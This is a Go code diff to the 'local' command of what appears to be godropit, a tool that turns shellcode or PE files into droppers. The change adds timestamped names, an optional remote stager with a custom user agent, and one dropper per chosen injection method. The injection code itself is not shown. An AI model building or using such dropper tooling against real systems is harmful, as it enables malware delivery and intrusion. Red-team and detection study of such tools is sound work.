@@ -5,6 +5,8 @@ package cmd
 
 import (
 	"log"
+	"strings"
+	"time"
 
 	"github.com/kopp0ut/godropit/internal/godroplib/local"
 	"github.com/kopp0ut/godropit/pkg/gengo"
@@ -24,12 +26,13 @@ var localCmd = &cobra.Command{
 		if input == "" {
 			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
 		}
+		if prestamp {
+			name = time.Now().UTC().Format("010206_1504") + "_" + name
+		}
 
-		name = check(name)
 		gengo.Garble = garble
 		var localDrop gengo.Dropper
-		localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal(gengo.Leet)
-		localDrop.Delay = time
+		localDrop.Delay = timer
 		localDrop.Arch = arch
 		localDrop.Shared = shared
 		localDrop.Debug = debug
@@ -37,12 +40,28 @@ var localCmd = &cobra.Command{
 		if loop {
 			localDrop.Hold = local.Hold
 		} else {
-			localDrop.Hold = "//notreq"
+			localDrop.Hold = ""
 		}
 
-		localDrop.Dtype = "//notreq"
+		shellcode := gengo.NewShellcode(&localDrop, input, output, name, sgn)
 
-		gengo.NewDropper(localDrop, name, domain, input, output, stagerurl, imgpath, hostname, ua, sgn)
+		if stagerurl != "" {
+			gengo.NewStager(&localDrop, shellcode, stagerurl, imgpath, hostname, ua, name, output)
+
+		}
+
+		if len(methods) >= 1 {
+			for i := range methods {
+				method := methods[i]
+				localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal(strings.ToLower(method))
+				methodname := name + "_" + method
+				gengo.NewDropper(localDrop, methodname, domain, input, output)
+			}
+		} else {
+			localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal("")
+
+			gengo.NewDropper(localDrop, name, domain, input, output)
+		}
 	},
 }
 
